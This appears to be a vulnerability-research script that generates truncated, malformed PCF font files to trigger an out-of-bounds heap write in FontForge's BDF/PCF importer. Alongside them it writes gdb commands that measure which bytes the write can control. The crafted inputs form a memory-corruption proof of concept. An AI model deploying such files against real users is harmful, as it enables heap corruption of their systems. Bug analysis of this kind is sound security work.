#!/usr/bin/env python3
"""Measure the maximum value the pinned :1751 overflow can write.

Pinned expression (fvimportbdf.c:1751):
  encs[glyph] = (i/(max2-min2+1) + min2)*256 + (i%(max2-min2+1) + min1);
min2/max2/min1/max1 are getformint16() results, so each is in [0,65535].
With min2=max2 and min1=max1 and a single iteration i=0 the RHS is exactly
  min2*256 + min1
which is at most 65535*256 + 65535 = 0x0100FEFF. Therefore the fourth byte
(bits 24..31) is 0x00 or 0x01, never an arbitrary pointer byte.

Ending the file one byte into the first glyph index (low byte 0xff) makes
getformint16 return -1, so glyph=-1 and the write lands at encs-4, the high
half of encs' own glibc chunk size word. The gdb cmd watches that word and
dumps the heap immediately before encs to look for pointer-shaped objects.
"""
import pathlib
import struct

HERE = pathlib.Path(__file__).resolve().parent
BASE = bytearray((HERE / "truncated.pcf").read_bytes())


def case(name, min2, min1, low_byte=None, full_index=None):
    data = bytearray(BASE[:0x123])
    struct.pack_into("<HHHH", data, 0x118, min2, min2, min1, min1)
    if low_byte is not None:
        data[0x122] = low_byte
        data = data[:0x123]
    else:
        data[0x122:0x123] = struct.pack("<H", full_index)
    out = HERE / name
    out.write_bytes(data)
    rhs = min2 * 256 + min1
    print(f"{name}: {len(data)} bytes min2=min1..=0x{min2:x}/0x{min1:x} "
          f"rhs={rhs:#010x} index={low_byte:#04x}" if low_byte is not None else
          f"{name}: {len(data)} bytes in-bounds control index={full_index:#x}")


for _name in ("value-ceiling", "value-ptrlow", "value-complete"):
    (HERE / f"import-{_name}.ff").write_text(
        "New()\n"
        f'Import("{HERE / (_name + ".pcf")}")\n'
    )

(HERE / "gdb-value-ceiling.cmd").write_text(
    "set pagination off\n"
    "break fvimportbdf.c:1751 if glyph < 0\n"
    "run -script import-value-ceiling.ff\n"
    'printf "HIT glyph=%d i=%d encs=%p\\n", glyph, i, encs\n'
    "printf \"fields min2=%d max2=%d min1=%d max1=%d tot=%d\\n\", min2, max2, min1, max1, tot\n"
    "x/16gx encs-64\n"
    "watch *(long*)((char*)encs-8)\n"
    "continue\n"
    "x/2gx encs-16\n"
    "x/4xb encs-4\n"
    "bt 3\n"
    "continue\n"
    "quit\n"
)

case("value-ceiling.pcf", 0xFFFF, 0xFFFF, low_byte=0xFF)   # rhs 0x0100FEFF, glyph -1
case("value-ptrlow.pcf", 0x4882, 0x0040, low_byte=0xFF)    # rhs 0x00488240 (3 chosen bytes)
case("value-complete.pcf", 0xFFFF, 0xFFFF, full_index=0x0001)  # in-bounds control
